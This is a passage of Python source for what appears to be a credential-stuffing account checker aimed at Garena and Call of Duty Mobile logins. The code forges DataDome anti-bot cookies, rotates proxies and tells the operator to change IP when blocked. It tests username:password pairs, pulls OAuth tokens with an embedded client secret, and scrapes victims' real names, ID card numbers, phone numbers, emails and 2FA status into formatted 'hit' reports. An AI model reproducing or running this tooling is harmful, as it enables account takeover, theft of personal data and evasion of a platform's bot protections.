O7O1KJTWRCIxBnFmVl2smSMkZ34xaqLcoM17k9zqA8RMYUpUjfnIjhCQCNtRpdJvVsyFVLujlhgBnkNg5ev27PYGgHzEQHeDsNOAMJOf-lzxKn8stzPJp0OjpCNsWcYW6NhbgwnS4y4zzsjGNWSSO8MFpeG-5v2B2ASKsex0TGFmRSsZIP6N_2nJP28QWQEDWL08qKJ1TyrR7P-XbpOm8UmHb2beK56hMHafXmISVakfP0dS3Oh224nYa6QMn8yYiNgvzDKik4bHHiIftnLcCaRZC8FIiioBnj69Ya0tWe0aXwgkNDiTj8ko60jsSFA6x0Y9uAQupjTGjAXkIUGRbfSa-h3qYe4dPiDb0OwpUM7beqkblKvbqNBqy8So5F8MPNaDAS7L0syTp2ugVvp0iwZCAB-4xWJqyToyzNJVrGU9K8jlX7qbh7d7NwqohBq1UT_wEjl2C4Vk1domhlfZeaUPfpMAwTMSLlogvpqsr5dcygjtcH2RL0xvorT9RItWdExi0ZEgZYR2e16sctZHqJdmHDLrcgfxHXV9XpX3I0M20fJe2yV1w5m_Kl5EDs72f8JcrKNvTgCGRa1Jmxu_3yXcWJ1hQSBFauGi6dXnBFk87FUjIewCpy6744anPrNjdBW9zZPAUN4t2E3ehNZKxRddzl9sGlUYR6xkDaKXCthj1sAwjuLfwrYaynulYXCzH9BymnYqWrBGEKQ6SP5OR7uxPfQVRnDPFqXP1kfZlwTNPcDGXUb-EWVxR9w7H6QVPTROp9nkdf_SSQ3u88x1gnD_SVwfwsIh9NXt1L-JidK1DEV2I72FcTxVH4sM4Ch8q8i6x1_Soo6CGnXNKFGUZE2xg8jo2G8O_pwSbOTULG5dXtt_4nFyCWsRhDeFBn7bvguKg0sl4cBHkD_Li8rN-3H8hFw137Q3N2v39DEXGfJEB0et2PX-4r1gVA7qqUHUcNwdvy6ZOcRQg_NYvGgcGWoQde5eAHIQ0avvSQGUHFEUb6NuiiOcKoDXipJtsbNi2UR3pIhfr8YsFQTqdz3NF2zo9IEvY0uds1VowMJAIBF001MlYmMQ3iAVutCrJnMehTpDFZztqzUJ917m72Snc2NA2LSPObaq5M6wiPpLnscG1yCJlVo52xazMfcn3jeRg-RoOAK-mHBSQ-W7oD',
        'eventCounters': '{"mousemove":4,"pointermove":1,"click":4,"scroll":0,"touchstart":4,"touchend":4,"touchmove":0,"keydown":2,"keyup":2}',
        'jsType': 'le',
        'cid': 'ROxC_oAlhyCRnDuIxNT_gKAsk8IOlYBFcrRuxfab_kt77Rrbyhu8xH21Zm6rN1hshR8R1vYl6Mlq8rC8fFRV7M9NV8EwyGm_EF0dY2yiLhcSRRttpELcrtVbTtmEMGG2',
        'ddk': 'AE3F04AD3F0D3A462481A337485081',
        'Referer': 'https%3A%2F%2Fsso.garena.com%2Funiversal%2Flogin%3Fapp_id%3D10100%26redirect_uri%3Dhttps%253A%252F%252Faccount.garena.com%252F%26locale%3Den-PH',
        'request': '%2Funiversal%2Flogin%3Fapp_id%3D10100%26redirect_uri%3Dhttps%253A%252F%252Faccount.garena.com%252F%26locale%3Den-PH',
        'responsePage': 'origin',
        'ddv': '5.8.0'
    }

    data = '&'.join((f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items()))

    try:
        response = session.post(url, headers=headers, data=data, proxies=proxies, timeout=30)
        response.raise_for_status()
        response_json = response.json()

        if response_json.get('status') == 200 and 'cookie' in response_json:
            cookie_string = response_json['cookie']
            if '=' in cookie_string and ';' in cookie_string:
                datadome = cookie_string.split(';')[0].split('=')[1]
            else:
                datadome = cookie_string
            return datadome
    except Exception:
        pass
    return None

class DataDome:
    def __init__(self):
        self.current_datadome = None
        self.datadome_history = []
        self._403_attempts = 0
    def set_datadome(self, datadome_cookie):
        if datadome_cookie and datadome_cookie != self.current_datadome:
            self.current_datadome = datadome_cookie
            self.datadome_history.append(datadome_cookie)
            if len(self.datadome_history) > 10:
                self.datadome_history.pop(0)
    def get_datadome(self):
        return self.current_datadome
    def extract_datadome_from_session(self, session):
        try:
            cookies_dict = session.cookies.get_dict()
            datadome_cookie = cookies_dict.get('datadome')
            if datadome_cookie:
                self.set_datadome(datadome_cookie)
                return datadome_cookie
            return None
        except Exception:
            return None
    def clear_session_datadome(self, session):
        try:
            if 'datadome' in session.cookies:
                del session.cookies['datadome']
        except Exception:
            pass
    def set_session_datadome(self, session, datadome_cookie=None):
        try:
            self.clear_session_datadome(session)
            cookie_to_use = datadome_cookie or self.current_datadome
            if cookie_to_use:
                session.cookies.set('datadome', cookie_to_use, domain='.garena.com')
                return True
            return False
        except Exception:
            return False
    def get_current_ip(self):
        ip_services = ['https://api.ipify.org', 'https://icanhazip.com', 'https://ident.me', 'https://checkip.amazonaws.com']
        for service in ip_services:
            try:
                response = requests.get(service, timeout=8)
                if response.status_code == 200:
                    ip = response.text.strip()
                    if ip and '.' in ip:
                        return ip
            except Exception:
                continue
        return None
    def wait_for_ip_change(self, session, check_interval=5, max_wait_time=200):
        global _ip_wait_lock, _ip_wait_active, _ip_wait_event
        with _ip_wait_lock:
            if _ip_wait_active:
                is_primary = False
            else:
                _ip_wait_active = True
                _ip_wait_event.clear()
                is_primary = True
        if not is_primary:
            _ip_wait_event.wait(timeout=max_wait_time + 30)
            return True
        try:
            original_ip = self.get_current_ip()
            if not original_ip:
                if not _suppress_ip_prints:
                    _log('WARNING', 'IP BLOCKED — could not detect IP, waiting 10s')
                if _ip_block_callback:
                    _ip_block_callback(True)
                time.sleep(5)
                if _ip_block_callback:
                    _ip_block_callback(False)
                return True
            if not _suppress_ip_prints:
                _log('ERROR', f'IP BLOCKED — {original_ip}')
                _log('WARNING', 'Change your IP now — VPN / Mobile Data / Airplane Mode')
            if _ip_block_callback:
                _ip_block_callback(True)
            start_time = time.time()
            if not _suppress_ip_prints:
                while time.time() - start_time < max_wait_time:
                    time.sleep(check_interval)
                    current_ip = self.get_current_ip()
                    if current_ip and current_ip != original_ip:
                        _log('SUCCESS', f'IP changed: {original_ip} → {current_ip}')
                        if _ip_block_callback:
                            _ip_block_callback(False)
                        return True
                _log('ERROR', 'IP did not change within time limit')
                if _ip_block_callback:
                    _ip_block_callback(False)
                return False
            else:
                while time.time() - start_time < max_wait_time:
                    time.sleep(check_interval)
                    current_ip = self.get_current_ip()
                    if current_ip and current_ip != original_ip:
                        if _ip_block_callback:
                            _ip_block_callback(False)
                        return True
                if _ip_block_callback:
                    _ip_block_callback(False)
                return False
        finally:
            with _ip_wait_lock:
                _ip_wait_active = False
            _ip_wait_event.set()
    def handle_403(self, session):
        self._403_attempts += 1
        if self._403_attempts >= 3:
            if self.wait_for_ip_change(session):
                self._403_attempts = 0
                new_datadome = get_datadome_cookie(session)
                if new_datadome:
                    self.set_datadome(new_datadome)
                    self.set_session_datadome(session, new_datadome)
                return True
            else:
                return False
        return False

def prelogin(session, account, datadome_manager, cookie_manager, retries=3, proxy_manager=None):
    all_403 = True
    for attempt in range(retries):
        try:
            url = 'https://sso.garena.com/api/prelogin'
            params = {'app_id': '10100', 'account': account, 'format': 'json', 'id': str(int(time.time() * 1000))}
            current_cookies = session.cookies.get_dict()
            cookie_parts = []
            for cookie_name in ['apple_state_key', 'datadome', 'sso_key', '_ga', '_ga_XB5PSHEQB4', '_ga_1M7M9L6VPX']:
                if cookie_name in current_cookies:
                    cookie_parts.append(f'{cookie_name}={current_cookies[cookie_name]}')
            cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
            headers = {
                'Host': 'sso.garena.com',
                'Connection': 'keep-alive',
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'Accept': 'application/json, text/plain, */*',
                'sec-ch-ua-mobile': '?1',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
                'sec-ch-ua-platform': '"Android"',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Dest': 'empty',
                'Referer': 'https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-PH',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-PH,en-US;q=0.9,en;q=0.8'
            }
            if cookie_header:
                headers['cookie'] = cookie_header
            response = session.get(url, headers=headers, params=params, timeout=30)
            if response.status_code == 403:
                proxy_dict = dict(session.proxies) if hasattr(session, 'proxies') and session.proxies else None
                fresh_dd = get_datadome_cookie(session, proxies=proxy_dict)
                if fresh_dd:
                    datadome_manager.set_datadome(fresh_dd)
                    datadome_manager.set_session_datadome(session, fresh_dd)
                else:
                    datadome_manager.handle_403(session)
                if attempt < retries - 1:
                    time.sleep(1)
                    continue
                all_403 = True
                break
            if response.status_code == 429:
                time.sleep(3)
                continue
            response.raise_for_status()
            try:
                data = response.json()
            except json.JSONDecodeError:
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
                return (None, None, None)
            new_cookies = response.cookies.get_dict()
            new_datadome = new_cookies.get('datadome')
            if new_datadome:
                datadome_manager.set_datadome(new_datadome)
            if 'error' in data:
                return (None, None, new_datadome)
            v1 = data.get('v1')
            v2 = data.get('v2')
            if not v1 or not v2:
                return (None, None, new_datadome)
            return (v1, v2, new_datadome)
        except requests.exceptions.ConnectionError:
            all_403 = False
            if proxy_manager and proxy_manager.is_loaded():
                session.proxies.clear()
                session.proxies.update(proxy_manager.get_next())
            if attempt < retries - 1:
                time.sleep(2)
                continue
        except requests.exceptions.Timeout:
            all_403 = False
            if proxy_manager and proxy_manager.is_loaded():
                session.proxies.clear()
                session.proxies.update(proxy_manager.get_next())
            if attempt < retries - 1:
                time.sleep(0.5)
                continue
        except Exception:
            all_403 = False
            if attempt < retries - 1:
                time.sleep(1)
                continue
    if all_403:
        return ('IP_BLOCKED', None, None)
    return (None, None, None)

def login(session, account, password, v1, v2):
    hashed_password = hash_password(password, v1, v2)
    url = 'https://sso.garena.com/api/login'
    params = {
        'app_id': '10100',
        'account': account,
        'password': hashed_password,
        'redirect_uri': 'https://account.garena.com/',
        'format': 'json',
        'id': str(int(time.time() * 1000))
    }
    current_cookies = session.cookies.get_dict()
    cookie_parts = []
    for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
        if cookie_name in current_cookies:
            cookie_parts.append(f'{cookie_name}={current_cookies[cookie_name]}')
    cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
    headers = {
        'accept': 'application/json, text/plain, */*', 'referer': 'https://account.garena.com/', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'}
    if cookie_header:
        headers['cookie'] = cookie_header
    retries = 5
    for attempt in range(retries):
        try:
            response = session.get(url, headers=headers, params=params, timeout=30)
            response.raise_for_status()
            login_cookies = {}
            if 'set-cookie' in response.headers:
                for cookie_str in response.headers['set-cookie'].split(','):
                    if '=' in cookie_str:
                        try:
                            cookie_name = cookie_str.split('=')[0].strip()
                            cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
                            if cookie_name and cookie_value:
                                login_cookies[cookie_name] = cookie_value
                        except Exception:
                            pass
            try:
                for k, v in response.cookies.get_dict().items():
                    if k not in login_cookies:
                        login_cookies[k] = v
            except Exception:
                pass
            for k, v in login_cookies.items():
                if k in ['sso_key', 'apple_state_key', 'datadome']:
                    session.cookies.set(k, v, domain='.garena.com')
            try:
                data = response.json()
            except json.JSONDecodeError:
                if attempt < retries - 1:
                    time.sleep(0.5)
                    continue
                return None
            sso_key = login_cookies.get('sso_key') or response.cookies.get('sso_key')
            if 'error' in data:
                error_msg = data['error']
                if error_msg in ('ACCOUNT DOESNT EXIST', 'error_no_account', 'error_auth', 'error_user_ban', 'error_security_ban'):
                    return f'permanent_fail:{error_msg}'
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
                return None
            return sso_key
        except requests.RequestException:
            if attempt < retries - 1:
                time.sleep(0.5)
                continue
    return None

def _generate_device_id():
    import uuid
    return f'02-{uuid.uuid4()}'

def get_codm_grant_code(session):
    for attempt in range(OAUTH_MAX_RETRIES):
        try:
            random_id = str(int(time.time() * 1000))
            grant_url = 'https://100082.connect.garena.com/oauth/token/grant'
            current_cookies = session.cookies.get_dict()
            cookie_parts = []
            for name in ['apple_state_key', 'fb_state', 'google_state', 'huawei_state', 'line_state', 'twitter_state', 'vk_state', 'tiktok_state', 'youtube_state', 'sso_key', 'datadome']:
                if name in current_cookies:
                    cookie_parts.append(f'{name}={current_cookies[name]}')
            cookie_header = '; '.join(cookie_parts)
            grant_headers = {
                'Host': '100082.connect.garena.com', 'Connection': 'keep-alive', 'Accept': 'application/json, text/plain, */*', 'User-Agent': 'Mozilla/5.0 (Linux; Android 9; Pixel 4 Build/PQ3A.190801.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36; GarenaMSDK/5.12.1(Pixel 4 ;Android 9;en;us;)', 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8', 'Origin': 'https://100082.connect.garena.com', 'X-Requested-With': 'com.garena.game.codm', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://100082.connect.garena.com/universal/oauth?client_id=100082&locale=en-US&create_grant=true&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'en-US,en;q=0.9'
            }
            if cookie_header:
                grant_headers['Cookie'] = cookie_header
            grant_body = f'client_id=100082&response_type=code&redirect_uri=gop100082%3A%2F%2Fauth%2F&create_grant=true&login_scenario=normal&format=json&id={random_id}'
            resp = session.post(grant_url, headers=grant_headers, data=grant_body, timeout=12)
            resp.raise_for_status()
            data = resp.json()
            code = data.get('code', '')
            if not code:
                logger.error(f'[ERROR] token/grant returned no code: {data}')
            return code
        except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
            if attempt < OAUTH_MAX_RETRIES - 1:
                delay = OAUTH_RETRY_DELAY * 2 ** attempt
                time.sleep(delay)
                continue
            else:
                logger.error(f'[ERROR] Error in get_codm_grant_code after {OAUTH_MAX_RETRIES} attempts')
                raise
        except Exception as e:
            logger.error(f'[ERROR] Error in get_codm_grant_code (token/grant)')
            return ''
    return ''

def token_exchange(code, device_id=None, proxies=None):
    if not device_id:
        device_id = _generate_device_id()
    if proxies is None:
        proxies = None
    CLIENT_ID = '100082'
    CLIENT_SECRET = '388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415'
    REDIRECT_URI = 'gop100082://auth/'
    exchange_url = 'https://100082.connect.garena.com/oauth/token/exchange'
    exchange_headers = {
        'User-Agent': 'GarenaMSDK/5.12.1(Pixel 4 ;Android 9;en;us;)', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': '100082.connect.garena.com', 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip'
    }
    exchange_body = f'grant_type=authorization_code&code={code}&device_id={urllib.parse.quote(device_id)}&redirect_uri={urllib.parse.quote(REDIRECT_URI)}&source=2&client_id={CLIENT_ID}&client_secret={CLIENT_SECRET}'
    for attempt in range(OAUTH_MAX_RETRIES):
        try:
            resp = requests.post(exchange_url, headers=exchange_headers, data=exchange_body, timeout=12, proxies=proxies)
            resp.raise_for_status()
            data = resp.json()
            access_token = data.get('access_token', '')
            if not access_token:
                logger.error(f'[ERROR] token/exchange returned no access_token: {data}')
            return access_token
        except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
            if attempt < OAUTH_MAX_RETRIES - 1:
                delay = OAUTH_RETRY_DELAY * 2 ** attempt
                time.sleep(delay)
                continue
            else:
                logger.error(f'[ERROR] Error in token_exchange after {OAUTH_MAX_RETRIES} attempts')
                raise
        except Exception as e:
            logger.error(f'[ERROR] Error in token_exchange (token/exchange)')
            return ''
    return ''

def get_codm_access_token(session):
    try:
        random_id = str(int(time.time() * 1000))
        grant_url = 'https://100082.connect.garena.com/oauth/token/grant'
        grant_headers = {
            'Host': '100082.connect.garena.com', 'Connection': 'keep-alive', 'sec-ch-ua-platform': '"Android"', 'User-Agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36; GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)', 'Accept': 'application/json, text/plain, */*', 'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Android WebView";v="144"', 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8', 'sec-ch-ua-mobile': '?1', 'Origin': 'https://100082.connect.garena.com', 'X-Requested-With': 'com.garena.game.codm', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://100082.connect.garena.com/universal/oauth?client_id=100082&locale=en-US&create_grant=true&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code', 'Accept-Encoding': 'gzip, deflate, br, zstd', 'Accept-Language': 'en-US,en;q=0.9'
        }
        import uuid
        device_id = f'02-{str(uuid.uuid4())}'
        grant_data = f'client_id=100082&redirect_uri=gop100082%3A%2F%2Fauth%2F&response_type=code&id={random_id}'
        grant_response = session.post(grant_url, headers=grant_headers, data=grant_data, timeout=15)
        grant_json = grant_response.json()
        auth_code = grant_json.get('code', '')
        if not auth_code:
            return ('', '', '')
        token_url = 'https://100082.connect.garena.com/oauth/token/exchange'
        token_headers = {
            'User-Agent': 'GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': '100082.connect.garena.com', 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip'
        }
        token_data = f'grant_type=authorization_code&code={auth_code}&device_id={device_id}&redirect_uri=gop100082%3A%2F%2Fauth%2F&source=2&client_id=100082&client_secret=388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415'
        token_response = session.post(token_url, headers=token_headers, data=token_data, timeout=15)
        token_json = token_response.json()
        access_token = token_json.get('access_token', '')
        open_id = token_json.get('open_id', '')
        uid = token_json.get('uid', '')
        return (access_token, open_id, uid)
    except Exception:
        return ('', '', '')

def process_codm_callback(session, access_token, open_id=None, uid=None):
    try:
        old_callback_url = f'https://api-delete-request.codm.garena.co.id/oauth/callback/?access_token={access_token}'
        old_headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36', 'referer': 'https://auth.garena.com/'
        }
        old_response = session.get(old_callback_url, headers=old_headers, allow_redirects=False, timeout=15)
        location = old_response.headers.get('Location', '')
        if 'err=3' in location:
            return (None, 'no_codm')
        elif 'token=' in location:
            token = location.split('token=')[-1].split('&')[0]
            return (token, 'success')
        aos_callback_url = f'https://api-delete-request-aos.codm.garena.co.id/oauth/callback/?access_token={access_token}'
        aos_headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36', 'referer': 'https://100082.connect.garena.com/', 'x-requested-with': 'com.garena.game.codm'
        }
        aos_response = session.get(aos_callback_url, headers=aos_headers, allow_redirects=False, timeout=15)
        aos_location = aos_response.headers.get('Location', '')
        if 'err=3' in aos_location:
            return (None, 'no_codm')
        elif 'token=' in aos_location:
            token = aos_location.split('token=')[-1].split('&')[0]
            return (token, 'success')
        return (None, 'unknown_error')
    except Exception:
        return (None, 'error')

def get_codm_user_info(session, token):
    try:
        try:
            import base64
            parts = token.split('.')
            if len(parts) == 3:
                payload = parts[1]
                padding = 4 - len(payload) % 4
                if padding != 4:
                    payload += '=' * padding
                decoded = base64.urlsafe_b64decode(payload)
                jwt_data = json.loads(decoded)
                user_data = jwt_data.get('user', {})
                if user_data:
                    return {
                        'codm_nickname': user_data.get('codm_nickname', user_data.get('nickname', 'N/A')),
                        'codm_level': user_data.get('codm_level', 'N/A'),
                        'region': user_data.get('region', 'N/A'),
                        'uid': user_data.get('uid', 'N/A'),
                        'open_id': user_data.get('open_id', 'N/A'),
                        't_open_id': user_data.get('t_open_id', 'N/A')
                    }
        except Exception:
            pass
        url = 'https://api-delete-request-aos.codm.garena.co.id/oauth/check_login/'
        headers = {
            'accept': 'application/json, text/plain, */*', 'codm-delete-token': token, 'origin': 'https://delete-request-aos.codm.garena.co.id', 'referer': 'https://delete-request-aos.codm.garena.co.id/', 'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36', 'x-requested-with': 'com.garena.game.codm'
        }
        response = session.get(url, headers=headers, timeout=10)
        data = response.json()
        user_data = data.get('user', {})
        if user_data:
            return {
                'codm_nickname': user_data.get('codm_nickname', 'N/A'),
                'codm_level': user_data.get('codm_level', 'N/A'),
                'region': user_data.get('region', 'N/A'),
                'uid': user_data.get('uid', 'N/A'),
                'open_id': user_data.get('open_id', 'N/A'),
                't_open_id': user_data.get('t_open_id', 'N/A')
            }
        return {}
    except Exception:
        return {}

def check_codm_account(session, account):
    codm_info = {}
    has_codm = False
    try:
        access_token, open_id, uid = get_codm_access_token(session)
        if not access_token:
            return (has_codm, codm_info)
        codm_token, status = process_codm_callback(session, access_token, open_id, uid)
        if status == 'no_codm':
            return (has_codm, codm_info)
        elif status != 'success' or not codm_token:
            return (has_codm, codm_info)
        codm_info = get_codm_user_info(session, codm_token)
        if codm_info:
            has_codm = True
    except Exception:
        pass
    return (has_codm, codm_info)

def parse_account_details(data):
    user_info = data.get('user_info', {})
    fb_username = 'N/A'
    fb_uid = 'N/A'
    if user_info.get('fb_account'):
        fb_username = user_info.get('fb_account', {}).get('fb_username', 'N/A')
        fb_uid = user_info.get('fb_account', {}).get('fb_uid', 'N/A')

    real_name = user_info.get('realname') or user_info.get('real_name') or 'N/A'
    id_card = user_info.get('idcard') or user_info.get('id_card') or 'N/A'
    avatar = user_info.get('avatar') or 'N/A'
    signature = user_info.get('signature') or 'N/A'
    suspicious = bool(user_info.get('suspicious', False))
    password_strength = user_info.get('password_s') or 'N/A'
    email_verified_time_raw = user_info.get('email_verified_time', 0)
    id_card_length = user_info.get('idcard_length') or 'N/A'
    whitelistable = bool(user_info.get('whitelistable', False))
    realinfo_updatable = bool(user_info.get('realinfo_updatable', False))
    create_time_raw = user_info.get('create_time', 0) or user_info.get('reg_time', 0)
    email_verified_time = 'N/A'
    if email_verified_time_raw and email_verified_time_raw > 0:
        email_verified_time = time.strftime('%B %d, %Y', time.localtime(email_verified_time_raw))
    account_created = 'N/A'
    if create_time_raw and create_time_raw > 0:
        account_created = time.strftime('%B %d, %Y', time.localtime(create_time_raw))

    account_info = {
        'uid': user_info.get('uid', 'N/A'),
        'username': user_info.get('username', 'N/A'),
        'nickname': user_info.get('nickname', 'N/A'),
        'email': user_info.get('email', 'N/A'),
        'email_verified': bool(user_info.get('email_v', 0)),
        'email_verified_time': email_verified_time,
        'email_verify_available': bool(user_info.get('email_verify_available', False)),
        'security': {
            'password_strength': password_strength,
            'two_step_verify': bool(user_info.get('two_step_verify_enable', 0)),
            'authenticator_app': bool(user_info.get('authenticator_enable', 0)),
            'facebook_connected': bool(user_info.get('is_fbconnect_enabled', False)),
            'facebook_account': user_info.get('fb_account', None),
            'suspicious': suspicious
        },
        'personal': {
            'real_name': real_name,
            'id_card': id_card,
            'id_card_length': id_card_length,
            'country': user_info.get('acc_country', 'N/A'),
            'country_code': user_info.get('country_code', 'N/A'),
            'mobile_no': user_info.get('mobile_no', 'N/A'),
            'mobile_binding_status': 'Bound' if user_info.get('mobile_binding_status', 0) else 'Not Bound',
            'extra_data': user_info.get('realinfo_extra_data', {})
        },
        'profile': {
            'avatar': avatar,
            'signature': signature,
            'shell_balance': user_info.get('shell', 0)
        },
        'status': {
            'account_status': 'Active' if user_info.get('status', 0) == 1 else 'Inactive',
            'whitelistable': whitelistable,
            'realinfo_updatable': realinfo_updatable,
            'account_created': account_created
        },
        'facebook': {
            'fb_username': fb_username,
            'fb_uid': fb_uid
        },
        'binds': [],
        'game_info': []
    }

    mobile_no = account_info['personal']['mobile_no']
    email_verified = 1 if account_info['email_verified'] else 0
    mobile_is_na = mobile_no == 'N/A' or not mobile_no or str(mobile_no).strip() == ''
    is_clean = mobile_is_na and email_verified == 0
    email = account_info['email']
    id_card = account_info['personal']['id_card']
    if email and email != 'N/A' and str(email).strip() and (not email.startswith('***')):
        if email_verified == 1:
            account_info['binds'].append('Email (Verified)')
        else:
            account_info['binds'].append('Email')
    if not mobile_is_na:
        account_info['binds'].append('Phone')
    if account_info['security']['facebook_connected'] and fb_uid and (fb_uid != 'N/A'):
        account_info['binds'].append('Facebook')
    if id_card and id_card != 'N/A' and str(id_card).strip():
        account_info['binds'].append('ID Card')
    if account_info['security']['two_step_verify']:
        account_info['binds'].append('2FA')
    if account_info['security']['authenticator_app']:
        account_info['binds'].append('Authenticator')
    account_info['bind_status'] = 'Clean' if is_clean else f'Not Clean' if account_info['binds'] else 'Not Clean'
    account_info['is_clean'] = is_clean
    security_indicators = []
    if account_info['security']['two_step_verify']:
        security_indicators.append('2FA')
    if account_info['security']['authenticator_app']:
        security_indicators.append('Auth App')
    if account_info['security']['suspicious']:
        security_indicators.append('[WARNING] Suspicious')
    account_info['security_status'] = '[SUCCESS] Normal' if not security_indicators else ' | '.join(security_indicators)
    return account_info

def format_hit(username, password, shell, level, region, nickname, uid, mobile, email, email_ver, two_step, auth_app, country, last_login, is_clean, fb_link="N/A", fb_info="NOT CONNECTED", last_login_ip="Unknown", has_codm=True, connected_games=None, colorized=False, last_login_from="UNKNOWN", avatar="N/A", suspicious="FALSE", real_name="N/A", id_card="N/A", signature="N/A", password_strength="N/A", email_verified_time="N/A", id_card_length="N/A", whitelistable="N/A", realinfo_updatable="N/A", account_created="N/A"):
    if connected_games is None:
        connected_games = []
    c_flag = get_flag(country) if country and country != 'N/A' else ''
    r_flag = get_flag(region) if region and region != 'N/A' else ''

    def sep_line(col, width=60):
        return f"{col}{'─' * width}{RESET}"

    def kv_line(key, value, kc, vc, width=18):
        if value is None or value == '':
            value = 'N/A'
        return f"{kc}{key:<{width}}{RESET}{vc}{value}{RESET}"

    if colorized:
        lines = []
        title_col = DUSTY_ROSE
        label_col = WARM_GRAY
        value_col = SOFT_WHITE
        sep_col = DUSTY_ROSE
        width = 60

        lines.append("")
        lines.append(sep_line(sep_col, width))
        lines.append(f"  {title_col}◈  ACCOUNT INFORMATION{RESET}")
        lines.append(sep_line(sep_col, width))

        lines.append(kv_line("Credentials", f"{username}:{password}", label_col, value_col))
        lines.append(kv_line("Shells", shell, label_col, value_col))
        lines.append(kv_line("Email", email, label_col, value_col))
        lines.append(kv_line("Mobile", mobile, label_col, value_col))
        lines.append(kv_line("Garena Server", f"{country} {c_flag}", label_col, value_col))

        lines.append("")
        lines.append(sep_line(sep_col, width))
        lines.append(f"  {title_col}◈  EXTRA INFO{RESET}")
        lines.append(sep_line(sep_col, width))

        lines.append(kv_line("Real Name", real_name, label_col, value_col))
        lines.append(kv_line("ID Card", id_card, label_col, value_col))
        lines.append(kv_line("ID Card Len", id_card_length, label_col, value_col))
        lines.append(kv_line("Signature", signature, label_col, value_col))
        lines.append(kv_line("Password Str", password_strength, label_col, value_col))
        lines.append(kv_line("Account Created", account_created, label_col, value_col))
        lines.append(kv_line("Avatar", avatar, label_col, value_col))
        lines.append(kv_line("Suspicious", suspicious, label_col, value_col))

        if has_codm and level and level != 'N/A':
            lines.append("")
            lines.append(sep_line(SAGE, width))
            lines.append(f"  {SAGE}◈  CODM INFORMATION{RESET}")
            lines.append(sep_line(SAGE, width))
            lines.append(kv_line("Nickname", nickname, label_col, value_col))
            lines.append(kv_line("UID", uid, label_col, value_col))
            lines.append(kv_line("Level", level, label_col, value_col))
            lines.append(kv_line("Server", f"{region} {r_flag}", label_col, value_col))

        lines.append("")
        lines.append(sep_line(TAUPE, width))
        lines.append(f"  {TAUPE}◈  BINDINGS & SECURITY{RESET}")
        lines.append(sep_line(TAUPE, width))

        lines.append(kv_line("FB Connected", fb_info, label_col, value_col))
        lines.append(kv_line("2FA", two_step, label_col, value_col))
        lines.append(kv_line("Auth App", auth_app, label_col, value_col))
        lines.append(kv_line("Last Login IP", last_login_ip, label_col, value_col))
        lines.append(kv_line("Email Verified", email_verified_time, label_col, value_col))
        lines.append(kv_line("Whitelistable", whitelistable, label_col, value_col))
        lines.append(kv_line("RealInfo Upd", realinfo_updatable, label_col, value_col))
        lines.append(kv_line("Last Login Date", last_login, label_col, value_col))
        lines.append(kv_line("Login From", last_login_from, label_col, value_col))

        if connected_games:
            lines.append("")
            lines.append(sep_line(CLAY, width))
            lines.append(f"  {CLAY}◈  CONNECTED GAMES{RESET}")
            lines.append(sep_line(CLAY, width))
            for g in connected_games:
                lines.append(f"  {label_col}• {RESET}{value_col}{g}{RESET}")
        else:
            lines.append("")
            lines.append(sep_line(CLAY, width))
            lines.append(f"  {CLAY}◈  CONNECTED GAMES{RESET}")
            lines.append(sep_line(CLAY, width))
            lines.append(f"  {label_col}None{RESET}")

        lines.append("")
